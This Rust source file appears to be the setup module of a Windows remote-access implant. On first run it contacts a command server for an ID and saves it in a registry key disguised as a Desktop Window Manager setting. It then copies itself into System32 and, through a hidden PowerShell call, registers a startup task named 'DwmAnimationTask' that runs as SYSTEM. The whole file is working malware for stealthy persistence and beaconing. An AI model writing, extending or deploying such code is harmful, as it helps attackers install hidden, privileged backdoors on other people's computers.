#[path = "types/mod.rs"]
mod types;
use types::Codes;
use types::Packet;

use std::path::Path;
use std::process::Command;
use winreg::{enums::HKEY_LOCAL_MACHINE, RegKey};

use tokio::io::AsyncWriteExt;
use tokio::net::TcpStream;

use crate::{CONNECTION_RETRY_DELAY, SERVER_ADDR};

#[allow(dead_code)]
fn setup_persistence(uuid: &str) -> Result<(), Box<dyn std::error::Error>> {
    // let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
    // // copies current exe to System32/uuid/uuid.exe
    let current_exe = match std::env::current_exe() {
        Ok(exe) => exe,
        Err(err) => {
            println!("{}", err);
            std::process::exit(1)
        }
    };
    let system32_dir = Path::new(&std::env::var("SystemRoot").unwrap()).join("System32");
    let uuid_dir = system32_dir.join(&uuid);
    std::fs::create_dir_all(&uuid_dir)?;
    let dest_path = uuid_dir.join(format!("{}.exe", &uuid));
    std::fs::copy(&current_exe, &dest_path)?;

    let powershell_command = format!(
        r#"
        $action = New-ScheduledTaskAction -Execute "{}"
        $trigger = New-ScheduledTaskTrigger -AtStartup
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
        Register-ScheduledTask -TaskName "DwmAnimationTask" -Action $action -Trigger $trigger -Principal $principal -Settings $settings
    "#,
        dest_path.display()
    );
    Command::new("powershell")
        .args(&["-WindowStyle", "hidden", "-Command", &powershell_command])
        .spawn()
        .expect("Failed to execute PowerShell command");

    Ok(())
}

async fn first_launch_setup() -> Result<(), Box<dyn std::error::Error>> {
    // Check if the program has been launched before

    // prepare key
    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
    // SOFTWARE\\Microsoft\\Windows\\Dwm"
    let path = Path::new("SOFTWARE")
        .join("Microsoft")
        .join("Windows")
        .join("Dwm");
    let (key, _) = match hklm.create_subkey(&path) {
        Ok(key) => key,
        Err(err) => {
            println!("{}", err);
            std::process::exit(1)
        }
    };

    // connects to server
    let mut stream = loop {
        match TcpStream::connect(SERVER_ADDR).await {
            Ok(stream) => break stream,
            Err(_) => {
                tokio::time::sleep(std::time::Duration::from_secs(CONNECTION_RETRY_DELAY)).await;
                continue;
            }
        }
    };
    // asks for uuid
    stream.writable().await?;
    let packet = Packet::new(Codes::AskUuid, &[]);
    stream.write(&packet.to_bytes()).await?;

    // reads uuid
    stream.readable().await?;

    let packet = Packet::from_stream(&mut stream).await;
    let uuid = match String::from_utf8(packet.buf.to_vec()) {
        Ok(uuid) => uuid,
        Err(_) => {
            println!("Failed to parse uuid");
            std::process::exit(1)
        }
    };
    // saves uuid in registry
    match key.set_value("AnimationSessionUuid", &uuid) {
        Ok(_) => {}
        Err(err) => {
            println!("{}", err);
            println!("Failed to save uuid in registry")
        }
    };

    setup_persistence(uuid.as_str())?;
    stream.shutdown().await?;

    std::process::exit(0);
}

pub async fn initialisation() -> String {
    if std::env::consts::OS != "windows" {
        std::process::exit(1)
    }

    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
    let dwm = match hklm.open_subkey("SOFTWARE\\Microsoft\\Windows\\Dwm") {
        Ok(dwm) => dwm,
        Err(_) => {
            println!("Dwm not found");
            std::process::exit(1)
        }
    };
    let value: String = match dwm.get_value("AnimationSessionUuid") {
        Ok(value) => value,
        Err(_) => {
            first_launch_setup().await.unwrap();
            "".to_string()
        }
    };

    return value;
}
